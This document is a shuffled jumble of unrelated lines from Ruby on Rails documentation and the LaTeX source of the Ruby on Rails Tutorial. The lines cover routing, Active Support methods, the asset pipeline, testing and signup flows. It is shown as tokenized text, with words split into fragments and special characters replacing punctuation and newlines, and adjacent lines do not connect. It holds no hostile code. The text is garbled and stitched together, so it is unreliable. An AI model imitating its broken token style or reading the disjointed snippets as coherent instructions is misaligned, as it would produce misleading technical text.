▁To ▁override ▁this ▁behavior ▁( and ▁ force ▁a ▁database ▁read ), ▁pass ▁` true ` ▁as ▁the ▁` force _ reload ` ▁argument .
▁Verify ▁that ▁the ▁right ▁page ▁template ▁is ▁rendered
▁24 , ▁ 25 , ▁2 6 , ▁ 27 , ▁28 , ▁29 , ▁30 , ▁31 , ▁ 32 , ▁3 3 , ▁ 34 , ▁3 5 , ▁ 36 , ▁ 37 , ▁ 38 , ▁3 9 , ▁40 , ▁4 1, ▁ 42,
▁< h 1> Article s </ h 1>
▁#### ▁text _ field
▁=> ▁1▖ ▖ 5
▁# ▁collection ▁has ▁not ▁been ▁loaded , ▁it ▁is ▁equivalent ▁to
▁You ▁may ▁also ▁want ▁to ▁follow ▁the ▁setup ▁instructions ▁for ▁\ href { https :// github ▖ com / mhartl / rails _ tutorial _ s ublime _ text } { Rails ▁Tutorial ▁S ublime ▁Text } ▁at ▁this ▁time
▁By ▁passing ▁the ▁optional ▁parameters ▁\ k ode { name : string } ▁and ▁\ k ode { email : string }, ▁we ▁tell ▁Rails ▁about ▁the ▁two ▁attributes ▁we ▁want , ▁along ▁with ▁what ▁types ▁those ▁attributes ▁should ▁be ▁( in ▁this ▁case , ▁\ k ode { string }) .
▁ Writ ing ▁the ▁application ▁code ▁needed ▁to ▁get ▁the ▁tests ▁in ▁Listing ~\ ref { code : micropost _ access _ control } ▁to ▁pass ▁requires ▁a ▁little ▁refactoring ▁first .
▁Listing ~\ ref { code : layout _ links _ test } ▁uses ▁some ▁of ▁the ▁more ▁advanced ▁options ▁of ▁the ▁\ k ode { assert \_ select } ▁method , ▁seen ▁before ▁in ▁Listing ~\ ref { code : title _ tests } ▁and ▁Listing ~\ ref { code : contact _ page _ test } .
▁As ▁noted ▁in ▁Section ~\ ref { sec : a _ hashed _ password }, ▁`` un encrypted ▁password '' ▁is ▁a ▁ mis no m er , ▁as ▁the ▁secure ▁password ▁is ▁\ emph { hashed }, ▁not ▁ encrypted .
▁as ▁show n ▁in ▁Listing ~\ ref { code : full _ title _ helper _ tests } .
▁### ▁Creat ing ▁Rails ▁En v ir on ment s
▁Also ▁" an ▁SQLite ▁database " .
▁A ╼ g re at ▁place ▁for ▁that ▁would ▁be ▁at ▁` / articles / new ` ▖
▁ Software ▁development ▁is ▁usually ▁an ▁it er a tive ▁process --- you ▁write ▁code ▁un til ▁it ▁start s ▁getting ▁ugly , ▁and ▁then ▁you ▁refactor ▁it --- but ▁for ▁brevity ▁the ▁tutorial ▁present ation ▁is ▁ str ea m line d ▁a ▁bit .
▁TIP : ▁You ▁can ▁see ▁all ▁of ▁the ▁command ▁line ▁options ▁that ▁the ▁Rails ▁application ╼ builder ▁accept s ▁by ▁running ▁` rails ▁new ▁- h ` .
▁### ▁ Class ▁Attributes
▁How ▁co ol ▁is ▁that ?
▁Active ▁Support ▁defines ▁` Date ▖ current ` ▁to ▁be ▁ today ▁in ▁the ▁current ▁time ▁ zone ▖
▁The ▁default ▁\ k ode { Gemfile } ▁in ▁the ▁\ k ode { hello \_ app } ▁directory .
▁The ▁method ▁` to _ sentence ` ▁turn s ▁an ▁array ▁into ▁a ▁string ▁containing ▁a ▁ sentence ▁that ▁ enumerate s ▁its ▁ items :
▁There ▁is ▁one ▁break ▁with ▁ past ▁convention ▁worth ▁noting : ▁the ▁interface ▁to ▁the ▁Microposts ▁resource ▁will ▁run ▁principal ly ▁through ▁the ▁ Pro file ▁and ▁Home ▁pages , ▁so ▁we ▁won ' t ▁need ▁actions ▁like ▁\ k ode { new } ▁or ▁\ k ode { edit } ▁in ▁the ▁Microposts ▁controller ; ▁we ' ll ▁need ▁only ▁\ k ode { create } ▁and ▁\ k ode { destroy } .
▁\ href { http :// on line ▖ p ragmatic s tudio ▖ com /}{ P ragmatic ▁S tudio } : ▁On line ▁Ruby ▁and ▁Rails ▁course s ▁from ▁M i k e ▁and ▁N ic o le ▁Clark .
▁invoke ▁test _ unit
▁12345678▖ 05 ▖ to _ s (: delimited ) ▁# ▁=> ▁12,345,678 ▖ 05
▁Rails ▁has ▁5 ▁initialization ▁events ▁which ▁can ▁be ▁ hook ed ▁into ▁( list ed ▁in ▁the ▁order ▁that ▁they ▁are ▁run ) :
▁The ▁best ▁way ▁to ▁understand ▁how ▁the ▁code ▁in ▁Listing ~\ ref { code : first _ create _ action } ▁works ▁is ▁to ▁\ emph { submit } ▁the ▁form ▁with ▁some ▁invalid ▁signup ▁data .
▁Here ▁the ▁option ▁\ k ode { dependent : ▁: destroy } ▁arrange s ▁for ▁the ▁ dependent ▁microposts ▁to ▁be ▁destroyed ▁when ▁the ▁user ▁itself ▁is ▁destroyed .
▁belongs _ to ▁: image able , ▁ polymorphic : ▁true
▁> > ▁p ▖ save
▁The ▁` body ` ▁ param ▁is ▁required ▁by ▁Sprockets .
▁The ▁final ▁command ▁here ▁arrange s ▁to ▁push ▁the ▁\ k ode { static - pages } ▁topic ▁branch ▁up ▁to ▁Bitbucket .
▁add _ header ▁ Cache - Control ▁public ;
▁The ▁code
▁validates ▁: age , ▁ numericality : ▁true , ▁on : ▁: update
▁#### ▁` reverse _ update `
▁The ▁second ▁render ▁just ▁defines ▁the ▁partial ▁template ▁we ▁want ▁to ▁render , ╼` comments / form ` ▖
▁from ▁Listing ~\ ref { code : respond _ to _ password _ digest } ▁to
▁# ▁config ▖ assets ▖ manifest ▁= ▁ Y O U R _ PATH
▁ensure s ▁that ▁Guard ▁doesn ' t ▁run ▁all ▁the ▁tests ▁after ▁a ▁failing ▁test ▁passes ▁( to ▁ speed ▁up ▁the ▁Re d - Green - Refactor ▁c y c le ) .
▁# ▁My App / app / models / blorgh / article ▖ rb
▁* ▁` config ▖ action _ view ▖ default _ form _ builder ` ▁tell s ▁Rails ▁which ▁form ▁ builder ▁to ▁use ▁by ▁default ▖
▁If ▁you ▁want ▁to ▁use ▁the ▁new ▁` secrets ▖ yml ` ▁convention ▁to ▁store ▁your ▁application ' s ╼ secrets , ▁you ▁need ▁to :
▁A lthough ▁the ▁view ▁will ▁exist ▁as ▁a ▁single ▁page ▁of ▁code , ▁each ▁profile ▁will ▁be ▁customize d ▁using ▁information ▁retrieved ▁from ▁the ▁site ' s ▁database .
▁# ▁# ▁=> ▁< label ▁for =" article _ title "> Title </ label >
▁def ▁ stringify _ keys
▁In ▁Listing ~\ ref { code : word _ class }, ▁note ▁that ▁check ing ▁that ▁the ▁word ▁is ▁its ▁own ▁ reverse ▁involve s ▁access ing ▁the ▁word ▁inside ▁the ▁\ k ode { Word } ▁class .
▁RESTful ▁routes ▁provided ▁by ▁the ▁custom ▁rules ▁in ▁resource ▁in ▁Listing ~\ ref { code : following _ followers _ action s _ routes } .
▁app
▁There ' s ▁not h ing ▁there ▁yet , ▁though , ▁so ▁let ' s ▁get ▁b us y ▁ deploying .
▁If ▁you ▁require ▁an ▁` Array `, ▁use ▁` where (▖▖▖) ▖ to _ a ` .
▁alias _ method ▁: origin al _ process , ▁: process
▁If ▁you ▁wait ▁a ▁couple ▁minutes ▁and ▁ reload ▁the ▁pages , ▁you ' ll ▁see ▁how ▁the ▁text ▁get s ▁automatically ▁updated ▁base d ▁on ▁the ▁new ▁time .
▁ { code : demo _ length _ validation } ▁works ▁on ▁the ▁production ▁app ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - de b cc 6 ' ></ span >╼ \ end { enumerate }╼╼ ▁\ section { Co nclusion } ▁% ▁( fold )╼ ▁\ label { sec : toy _ app _ co nclusion }╼╼
▁ Cookie s ▁ expire ▁\ text tt { 20 ▖ years ▖ from \_ now }
▁You ▁can ▁run ▁tests ▁only ▁for ▁a ▁particular ▁ com p on ent ▁( e ▖ g ▖ ▁Action ▁Pack )▖
▁With ▁this ▁change , ▁you ▁should ▁finally ▁be ▁able ▁to ▁create ▁new ▁articles .
▁With ▁the ▁code ▁in ▁this ▁form , ▁there ▁will ▁likely ▁be ▁a ▁problem ▁if ▁the ▁`@ book ` ▁variable ▁is ▁` nil ` ▖
▁In ▁this ▁case , ▁these ▁routes ▁are ▁\ k ode { root \_ path } ▁and ▁\ k ode { root \_ url }, ▁with ▁the ▁only ▁difference ▁being ▁that ▁the ▁latter ▁includes ▁the ▁full ▁URL :
▁If ▁any ▁of ▁the ▁files ▁in ▁the ▁manifest ▁have ▁changed ▁between ▁requests , ▁the ▁server ╼ respond s ▁with ▁a ▁new ▁ compiled ▁file .
▁# ▁Person ▖ exists ?( ['
▁### ▁ Methods ▁defined ▁in ▁Active ▁Record ▁fixtures
▁Route ▁g lo b b ing ▁is ▁a ▁way ▁to ▁specify ▁that ▁a ▁particular ▁parameter ▁should ▁be ▁match ed ▁to ▁all ▁the ▁re main ing ▁parts ▁of ▁a ▁route ▖
▁* ▁The ▁[ Ruby ▁on ▁Rails ▁Tutorial ]( http :// railstutorial ▖ org / book )
▁The ▁method ▁` is _ missing ?` ▁provides ▁a ▁way ▁to ▁distinguish ▁both ▁cases :
▁The ▁user ▁ home ▁page ▁after ▁ deleting ▁the ▁second - most - recent ▁micropost ▖ ~\ href { http :// railstutorial ▖ org / images / figures / home _ post _ delete _ bootstrap - full ▖ png }{( full ▁size )}
▁\ label { fig : micropost _ image _ mockup } }╼\ end { figure }╼╼\ subsection { B as ic ▁image ▁upload } ▁% ▁( fold )╼\ label { sec : basic _ image _ upload }╼╼
▁This ▁will ▁allow ▁us ▁to ▁add ▁customizations ▁base d ▁on ▁signin ▁status ▁and ▁base d ▁on ▁the ▁id entity ▁of ▁the ▁current ▁user .
▁| ▁DELETE ▁| ▁ / magazine s / : magazine _ id / ads / : id ▁| ▁ ads # destroy ▁| ▁delete ▁a ▁specific ▁a d ▁ belonging ▁to ▁a ▁specific ▁ magazine ▁|
▁root ▁to : ▁" home # index "
▁" "▖ html _ safe ▁+ ▁"< " ▁# ▁=> ▁" & lt ; "
▁#### ▁ Options ▁for ▁` has _ and _ belongs _ to _ many `
▁You ' re ▁free ▁to ▁add
▁You ▁can ▁specify ▁a ▁single ▁constraint ▁to ▁apply ▁to ▁a ▁number ▁of ▁routes ▁by ▁using ▁the ▁block ▁form :
▁assemblies ▖ exists ? (▖▖▖)
▁ ╼ ▁To ▁get ▁help ▁on ▁this ▁sample ▁app , ▁see ▁the
▁ Array ▖ wrap ( [ 1, ▁2, ▁3] ) ▁# ▁=> ▁[1, ▁2, ▁3]
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁( n on - built - in ) ▁\ k ode { Word } ▁class ▁from ▁Listing ~\ ref { code : word _ class } .
▁By ▁default , ▁\ k ode { rake ▁test } ▁shows ▁red ▁when ▁the ▁tests ▁fail , ▁but ▁doesn ' t ▁show ▁green ▁when ▁the ▁tests ▁pass .
▁# ▁Pass ▁ { ▁page _ cache : ▁false ▁ } ▁argument ▁to ▁ Lifo :: Cache .
▁The ▁` subclasses ` ▁method ▁returns ▁the ▁ subclasses ▁of ▁the ▁receiver :
▁To ▁keep ▁rails ▁secure ▁by ▁default , ▁` deep _ munge ` ▁replace s ▁some ▁of ▁the ▁values ▁with ╼` nil ` ▖
▁instead , ▁and ▁it ▁would ▁work ▁just ▁the ▁same , ▁but ▁( as ▁mentioned ▁brief ly ▁in ▁Section ~\ ref { sec : exercises _ layout _ link _ tests }) ▁the ▁convention al ▁order ▁for ▁the ▁arguments ▁to ▁\ k ode { assert \_ equal } ▁is ▁\ emph { expect ed }, ▁\ emph { actual } :
▁A nother ▁strategy ▁recommended ▁by ▁multiple ▁readers ▁is ▁simply ▁to ▁do ▁the ▁tutorial ▁t w ice ; ▁you ▁may ▁be ▁surpris ed ▁at ▁how ▁much ▁you ▁ learned ▁the ▁first ▁time ▁( and ▁how ▁much ▁easier ▁it ▁is ▁the ▁second ▁time ▁through ) .
▁It ▁is ▁possible ▁to ▁send ▁email ▁to ▁one ▁or ▁more ▁re ci p i ent s ▁in ▁one ▁email ▁( e ▖ g ▖ ,╼ in form ing ▁all ▁admin s ▁of ▁a ▁new ▁signup ) ▁by ▁setting ▁the ▁list ▁of ▁email s ▁to ▁the ▁`: to `╼ key ▖
▁No ▁logging ▁in
▁( A lthough ▁the ▁\ k ode { authenticated ?}\ ▁method ▁in ▁Listing ~\ ref { code : authenticated _ p } ▁is ▁t i ed ▁specifically ▁to ▁the ▁remember ▁digest , ▁it ▁will ▁turn ▁out ▁to ▁be ▁useful ▁in ▁other ▁context s ▁as ▁well , ▁and ▁we ' ll ▁general ize ▁it ▁in ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset } ▖)
▁* = ▁require _ self
▁Having ▁written ▁some ▁simple ▁Cucumber ▁scenario s , ▁it ' s ▁worth ▁compar ing ▁the ▁result ▁to ▁the ▁equivalent ▁RSpec ▁examples .
▁In ▁Chapter ~\ ref { cha : sign _ up }, ▁we ▁implemented ▁user ▁signup ▁by ▁making ▁an ▁HTML ▁form ▁that ▁issue d ▁an ▁HTTP ▁\ text tt { POST } ▁request ▁to ▁the ▁\ k ode { create } ▁action ▁in ▁the ▁Users ▁controller .
▁Before ▁mov ing ▁on , ▁you ▁should ▁verify ▁that ▁the ▁test ▁suite ▁passes :
▁M any ▁languages ▁provide ▁a ▁ sy nt ac tic ▁shortcut ▁for ▁this ▁operation ; ▁in ▁Ruby ▁( and ▁in ▁C , ▁C + + , ▁ Perl , ▁P y th on , ▁ Java , ▁etc ▖) , ▁it ▁can ▁also ▁appear ▁as ▁follows :
▁This ▁is ▁particular ly ▁true ╼ for ▁ ORM ▁framework s ▁in ▁general ▖
▁* ▁` config ▖ exception s _ app ` ▁set s ▁the ▁exception s ▁application ▁invoke d ▁by ▁the ▁ Show E xception ▁middleware ▁when ▁an ▁exception ▁happens ▖
▁` # as _ json ` ▁for ▁objects ▁with ▁time ▁ com p on ent ▁( ` Time `, ▁` DateTime `, ▁` ActiveSupport :: Time With Z one ` )╼ now ▁returns ▁mil li second ▁ precision ▁by ▁default ▖
▁* ▁How ▁to ▁add ▁ additional ▁code ▁to ▁be ▁run ▁at ▁application ▁start ▁time .
▁#### # ▁` years _ ago `, ▁` years _ since `
▁In ▁this ▁case , ▁using ▁`@ customer ▖ confirmed _ orders ▖ create ` ▁or ▁`@ customer ▖ confirmed _ orders ▖ build ` ▁will ▁create ▁orders ▁where ▁the ▁ confirmed ▁column ▁has ▁the ▁value ▁` true ` .
▁#### ▁C her ry - pick ing ▁a ▁Defin it ion
▁* ▁` config ▖ action _ view ▖ cache _ template _ load ing ` ▁control s ▁whether ▁or ▁not ▁templates ▁should ▁be ▁ reload ed ▁on ▁each ▁request ▖
▁Ou r ▁main ▁testing ▁tool s ▁will ▁be ▁\ emph { controller ▁tests } ▁( start ing ▁in ▁this ▁section ), ▁\ emph { model ▁tests } ▁( start ing ▁in ▁Chapter ~\ ref { cha : modeling _ users }), ▁and ▁\ emph { integration ▁tests } ▁( start ing ▁in ▁Chapter ~\ ref { cha : sign _ up }) .
▁The ▁unique ▁ alternative ▁value ▁at ▁the ▁moment ▁is ▁`: yui `, ▁which ▁uses ▁the ▁` yui - compressor ` ▁gem .
▁### ▁config / environments / development ▖ rb
▁The ▁migration ▁for ▁enforc ing ▁email ▁uniqueness .
▁Some ▁commands ▁may ▁produce ▁errors ▁depending ▁on ▁your ▁system ; ▁rather ▁than ▁attempt ▁the ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / S is y ph us } { S is y ph e an } ▁task ▁of ▁document ing ▁all ▁such ▁errors ▁in ▁this ▁tutorial , ▁I ▁will ▁ delegate ▁to ▁the ▁`` Google ▁the ▁error ▁message '' ▁algorithm , ▁which ▁a mong ▁other ▁things ▁is ▁good ▁practice ▁for ▁real - life ▁software ▁development .
▁has _ and _ belongs _ to _ many ▁: part s
▁ Edit ▁the ▁` form _ for ` ▁line ▁inside ▁` app / views / articles / new ▖ html ▖ erb ` ▁to ▁look ▁like ╼ this :
▁1▖ object _ id ▁# ▁=> ▁3
▁As ▁with ▁model ▁inheritance , ▁both ▁the ▁Users ▁and ▁Microposts ▁controllers ▁gain ▁a ▁large ▁amount ▁of ▁functionality ▁by ▁inherit ing ▁from ▁a ▁base ▁class ▁( in ▁this ▁case , ▁\ k ode { ActionController :: Base }), ▁including ▁the ▁ability ▁to ▁manipulate ▁model ▁objects , ▁filter ▁in b ound ▁HTTP ▁requests , ▁and ▁render ▁views ▁as ▁HTML ▖ ▁S ince ▁all ▁Rails ▁controllers ▁inherit ▁from ▁\ k ode { Application Controller }, ▁rules ▁defined ▁in ▁the ▁Application ▁controller ▁automatically ▁apply ▁to ▁every ▁action ▁in ▁the ▁application .
▁With ▁` through : ▁: section s ` ▁specified , ▁Rails ▁will ▁now ▁understand :
▁c 1 ▁= ▁Client ▖ find (1)
▁Then ▁we ' ll ▁verify ▁that ▁the ▁correct ▁users ▁appear ▁on ▁the ▁first ▁page ▁of ▁results .
▁Listing ~\ ref { code : hello _ action } ▁shows ▁the ▁result ing ▁definition ▁of ▁\ k ode { hello }, ▁which ▁uses ▁the ▁\ k ode { render } ▁function ▁to ▁return ▁the ▁text ▁`` hello , ▁world !'' .
▁#### ▁` title ize `
▁If ▁you ▁want ▁to ▁use ▁ Spring ▁as ▁your ▁application ▁p reload er ▁you ▁need ▁to :
▁And ▁you ▁have ▁a ▁view ▁file ▁` app / views / books / index ▖ html ▖ erb `:
▁Configur ing ▁a ▁production ▁site ▁to ▁use ▁SSL ▁is ▁pa in ful ▁and ▁error - prone , ▁and ▁a mong ▁other ▁things ▁it ▁involve s ▁p ur cha s ing ▁an ▁\ emph { SSL ▁c er t if ic ate } ▁for ▁your ▁domain .
▁in ▁Listing ~\ ref { code : before _ create _ remember _ token } .
▁# ▁Blorgh / lib / con c er n s / models / article
▁in ▁Listing ~\ ref { code : signup _ form } .
▁Associations ▁are ▁implemented ▁using ▁ macro - style ▁calls , ▁so ▁that ▁you ▁can ▁declar a tive ly ▁add ▁features ▁to ▁your ▁models ▖
▁The ▁password ▁reset ▁mailer ▁method ▁needed ▁to ▁get ▁this ▁working ▁is ▁ nearly ▁identical ▁to ▁the ▁mailer ▁for ▁account ▁activation ▁ developed ▁in ▁Section ~\ ref { sec : account _ activation _ email s } .
▁| ▁` Mo use ` ▁| ▁` m ice ` ▁|
▁I ▁shall ▁be ▁late !" ▖ truncate _ words ( 4 , ▁omission : ▁' & hell ip ; ')
▁d ▖ prev _ week (: f ri day ) ▁# ▁=> ▁Fri , ▁30 ▁Apr ▁2010
▁The ▁method ▁` truncate _ words ` ▁returns ▁a ▁copy ▁of ▁its ▁receiver ▁ truncate d ▁after ▁a ▁given ▁number ▁of ▁words :
▁The ▁ uploader ▁in ▁Section ~\ ref { sec : basic _ image _ upload } ▁is ▁a ▁good ▁start , ▁but ▁it ▁has ▁significant ▁ limit ation s .
▁These ▁fingerprint ed ▁names ▁are ▁used ▁by ▁the ▁Rails ▁helpers ▁in ▁place ▁of ▁the ▁manifest ╼ name .
▁( The re ▁is ▁some ▁ po t en tial ▁for ▁con f us ion ▁here .
▁In ▁all ▁of ▁these ▁methods , ▁` association ` ▁is ▁replace d ▁with ▁the ▁symbol ▁passed ▁as ▁the ▁first ▁argument ▁to ▁` belongs _ to ` ▖
▁stylesheet _ url ▁" application " ▁# ▁=> ▁ http :// www ▖ example ▖ com / assets / application ▖ css
▁has _ many ▁: books
▁Now ▁that ▁we ▁have ▁a ▁correctly ▁generated ▁email ▁as ▁in ▁Listing ~\ ref { code : account _ activation _ email }, ▁we ▁need ▁to ▁write ▁an ▁\ k ode { edit } ▁action ▁in ▁the ▁ Account ▁ Activations ▁controller ▁to ▁activate ▁the ▁user .
▁do ▁| admin |
▁* ▁** P r im ary ▁keys ** ▁- ▁By ▁default , ▁Active ▁Record ▁will ▁use ▁an ▁ integer ▁column ▁named ╼ ▁` id ` ▁as ▁the ▁table ' s ▁primary ▁key ▖
▁Here ▁we ' ve ▁passed ▁the ▁id ▁of ▁the ▁user ▁to ▁\ k ode { User ▖ find } ; ▁Active ▁Record ▁returns ▁the ▁user ▁with ▁that ~ id .
▁By ▁including ▁\ k ode { name : string } ▁and ▁\ k ode { email : string }, ▁we ▁have ▁arrange d ▁for ▁the ▁User ▁model ▁to ▁have ▁the ▁form ▁show n ▁in ▁Figure ~\ ref { fig : demo _ user _ model } .
▁Sprockets ▁set s ▁a ▁` must - re validate ` ▁ Cache - Control ▁HTTP ▁header ▁to ▁reduce ▁request ╼ over head ▁on ▁subsequent ▁requests ▁- ▁on ▁these ▁the ▁browser ▁get s ▁a ▁30 4 ▁( Not ▁ Mo d if i ed )╼ response .
▁Here ' s ▁an ▁example ▁of ▁the ▁` set _ helpers _ path ` ▁initializer ▁from ▁Action ▁Controller :
▁In ▁development ▁mode , ▁or ▁if ▁the ▁asset ▁pipeline ▁is ▁ disabled , ▁when ▁these ▁files ▁are ╼ request ed ▁they ▁are ▁processed ▁by ▁the ▁process or s ▁provided ▁by ▁the ▁` coffee - script `╼ and ▁` sass ` ▁gems ▁and ▁then ▁sent ▁back ▁to ▁the ▁browser ▁as ▁JavaScript ▁and ▁CSS ╼ re spec tive ly ▖
▁To ▁assign ▁a ▁specific ▁layout ▁for ▁the ▁entire ▁application , ▁use ▁a ▁` layout ` ▁declaration ▁in ▁your ▁` Application Controller ` ▁class :
▁For ▁more ▁information ▁on ▁ RVM , ▁I ▁also ▁recommend ▁tak ing ▁a ▁look ▁at ▁the ▁article ▁\ href { http :// str and code ▖ com / 2013 / 07 / 11 / ruby - version - manager - rvm - overview - for - rails - new b s /}{ Ruby ▁ Version ▁Manager ▁( RVM ) ▁Over view ▁for ▁Rails ▁ New b s }
▁This ▁uses ▁the ▁built - in ▁Rails ▁function ▁\ k ode { stylesheet \_ link \_ tag } ▁( which ▁you ▁can ▁read ▁more ▁about ▁at ▁the ▁\ href { http :// api ▖ rubyonrails ▖ org / classes / ActionView / Helpers / AssetTagHelper ▖ html # method - i - stylesheet _ link _ tag } { Rails ▁API }) ▁to ▁include ▁\ k ode { application ▖ css } ▁for ▁all ▁\ href { http :// www ▖ w 3 ▖ org / T R / CSS 2 / media ▖ html } { media ▁types } ▁( including ▁computer ▁ screen s ▁and ▁ print ers ) .
▁ K eep ▁in ▁mind , ▁of ▁course , ▁that ▁anything ▁generated ▁with ▁these ▁commands ▁inside ▁of ╼ an ▁engine ▁that ▁has ▁` isolate _ namespace ` ▁in ▁the ▁` Engine ` ▁class ▁will ▁be ▁namespaced .
▁One ▁option ▁is ▁to ▁use ▁a ▁combination ▁of ▁the ▁id ▁and ▁the ▁name , ▁such ▁as ▁\ k ode {@ 1 - michael - hartl } .
▁class ▁Create Order s ▁< ▁ActiveRecord :: Migration
▁ ╼ ▁$ ▁bundle ▁exec ▁rake ▁- T
▁All ▁the ▁examples ▁so ▁far ▁have ▁used ▁\ emph { do ub le - quot ed ▁strings }, ▁but ▁Ruby ▁also ▁supports ▁\ emph { s ing le - quot ed } ▁strings .
▁The ▁route ▁now ▁exists , ▁but ▁the ▁controller ▁that ▁this ▁route ▁go es ▁to ▁does ▁not ▖
▁actually ▁works !
▁P o st ▁to ▁the ▁sessions ▁path ▁with ▁an ▁invalid ▁\ k ode { params } ▁hash .
▁xml ▖ p ub Date ( item _ p ub Date ( item ) )
▁def ▁start
▁### ▁` blank ?` ▁and ▁` present ?`
▁ Connection : ▁keep - al ive
▁class ▁C of fe e ▁< ▁ActiveRecord :: Base
▁ ╼ ▁* ▁------------ ---------------- ---------------- ---------------- ---------------- ╼ ▁* /
▁That ▁class ▁served ▁as ▁a ▁useful ▁example , ▁but ▁it ▁ la c k ed ▁the ▁ critical ▁property ▁of ▁\ emph { persistence } : ▁when ▁we ▁created ▁a ▁User ▁object ▁at ▁the ▁Rails ▁console , ▁it ▁disappear ed ▁as ▁soon ▁as ▁we ▁ ex it ed .
▁Basic ▁access ▁control ▁tests ▁for ▁relationships ▖
▁<%= ▁f ▖ label ▁: text ▁%>< br >
▁-> ▁0▖0 1 15 s
▁# ▁=> ▁1▖ 000 , 000 %
▁as ▁show n ▁in ▁Listing ~\ ref { code : default _ gitignore } .
▁class ▁G oodnessValidator
▁* ▁` force _ p l ur al ` ▁allows ▁ pluralize d ▁model ▁names ▖
▁ Adding ▁a ▁resource ▁for ▁password ▁resets .
▁* ▁If ▁the ▁returned ▁value ▁from ▁` to _ ary ` ▁is ▁ n either ▁` nil ` ▁no r ▁an ▁` Array ` ▁object , ▁` K ernel # Array ` ▁raise s ▁an ▁exception , ▁while ▁` Array ▖ wrap ` ▁does ▁not , ▁it ▁just ▁returns ▁the ▁value .
▁You ▁can ▁ n est ▁resources ▁within ▁other ▁nested ▁resources ▁if ▁you ▁like ▖
▁* ▁Check s ▁ pending ▁migrations ▁and ▁raise s ▁` ActiveRecord :: P end ing Migration Error ` ▁if ▁any ▁migrations ▁are ▁ pending .
▁The ▁default ▁error ▁message ▁for ▁this ▁option ▁is ▁_" must ▁be ▁less ╼ ▁than ▁or ▁equal ▁to ▁% { count } " _ .
▁render ▁layout : ▁false
▁This ▁code ▁arrange s ▁to ▁include ▁the ▁application ▁stylesheet ▁and ▁JavaScript , ▁which ▁are ▁part ▁of ▁the ▁asset ▁pipeline ▁( Section ~\ ref { sec : the _ asset _ pipeline }), ▁together ▁with ▁the ▁Rails ▁method ▁\ k ode { csrf \_ meta \_ tags }, ▁which ▁prevent s ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / C ross - site _ request _ forgery } { cross - site ▁request ▁ forgery } ▁( CSRF ), ▁a ▁type ▁of ▁ malicious ▁web ▁attack .
▁You ▁can ▁also ▁ unscope ▁specific ▁` where ` ▁clause s ▖
▁% w ( Earth )▖ to _ sentence ▁# ▁=> ▁" Earth "
▁as ▁show n ▁in ▁Listing ~\ ref { code : bootstrap _ css } .
▁* ▁The ▁URL ▁pattern ▁to ▁match
▁<%= ▁f ▖ text _ field ▁: title ▁%>
▁The ▁` collection ▖ delete ` ▁method ▁remove s ▁one ▁or ▁more ▁objects ▁from ▁the ▁collection ▁by ▁ deleting ▁records ▁in ▁the ▁join ▁table ▖
▁When ▁" true " ▁or ▁" false " ▁are ▁used ▁as ▁defined ▁in ▁Ruby ▁use ▁regular ▁f on t ▖
▁#### ▁ J o in ing ▁N est ed ▁Associations ▁( S ing le ▁L e ve l )
▁We ▁see ▁now ▁why ▁this ▁is ▁a ▁ cheat : ▁a la s , ▁\ k ode { sign \_ in } ▁doesn ' t ▁current ly ▁exist .
▁It ▁should ▁be ▁wrap ped ▁to ▁7 2 ╼ character s ▖
▁The ▁way ▁to ▁do ▁this ▁is ▁with ▁a ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / C all back _ ( computer _ science ) }{\ emph { callback } }, ▁which ▁is ▁a ▁method ▁that ▁get s ▁invoke d ▁at ▁a ▁particular ▁point ▁in ▁the ▁ life c y c le ▁of ▁an ▁Active ▁Record ▁object .
▁It ▁is ▁possible , ▁of ▁course , ▁to ▁arrange ▁for ▁this ▁information ▁to ▁be ▁handle d ▁secure ly ▁( by ▁ having ▁Git ▁ignore ▁it , ▁for ▁example ), ▁but ▁this ▁is ▁error - prone ▁and ▁requires ▁significant ▁ expert is e .
▁A ▁test ▁of ▁a ▁successful ▁edit ▖
▁get ▁' profile ', ▁to : ▁' users # show '
▁# ▁< id ▁type =" integer "> 4 58 3 </ id >
▁Add ▁tests ▁to ▁make ▁sure ▁that ▁these ▁links ▁\ emph { d on ' t } ▁appear ▁when ▁a ▁user ▁isn ' t ▁signed ▁in .
▁</ body >
▁in ▁Listing ~\ ref { code : home _ feed _ test } .
▁hash [: b ] [: d ] ▁== ▁[ 3 , ▁4 ] ▁# ▁=> ▁true
▁t ▖ next _ quarter ▁# ▁=> ▁Sun , ▁ 08 ▁A ug ▁2010
▁# ▁< url - id > a ar on - b at al ion </ url - id >
▁* ▁` ActiveSupport :: Cache :: S trategy :: Local Cache ` ▁serve s ▁as ▁a ▁basic ▁memory ▁back ed ▁cache ▖
▁D if f s ▁from ▁the ▁2 nd ▁ edition
▁<% ▁content _ for ▁: stylesheets ▁do ▁%>
▁It ▁is ▁my ▁h o pe ▁that ▁these ▁changes ▁will ▁make ▁the ▁third ▁ edition ▁of ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁ accessible ▁to ▁an ▁even ▁br o ad er ▁a udi ence ▁than ▁previous ▁versions .
▁With ▁these ▁routes ▁now ▁defined , ▁the ▁tests ▁for ▁the ▁Help , ▁About , ▁and ▁Contact ▁pages ▁should ▁pass :
▁set _ callback ▁: save , ▁: ar ound , ▁-> ( r , ▁& block ) ▁ { ▁ stuff ; ▁result ▁= ▁block ▖ call ; ▁ stuff ▁ }
▁This ▁includes ▁some ▁ additional ▁ div is ion s , ▁some ▁CSS ▁classes , ▁and ▁the ▁start ▁of ▁our ▁site ▁navigation .
▁For ▁example , ▁ RedCloth ▁ tr an s l ate s ▁` _ test _ ` ▁to ▁& lt ; em & gt ; test & lt ; em & gt ; , ▁which ▁make s ▁the ▁text ▁it al ic ▖
▁< w a it ▁a ▁while >
▁* ▁` has _ many ▁: through `
▁S k e let on ▁for ▁a ▁\ k ode { shuffle } ▁method ▁attached ▁to ▁the ▁\ k ode { String } ▁class .
▁╼╼\ begin { figure }╼\ begin { center }╼\ image box { images / figures / login _ page _ protected _ mockup ▖ png }╼\ end { center }╼\ caption { A ▁mockup ▁of ▁the ▁result ▁of ▁visit ing ▁a ▁ protected ▁page \ label { fig : login _ page _ protected _ mockup } }╼\ end { figure }╼╼ ▁\ subsection { Requir ing ▁logged - in ▁users } ▁% ▁( fold )╼ ▁\ label { sec : requiring _ logged _ in _ users }╼╼
▁### ▁ Update
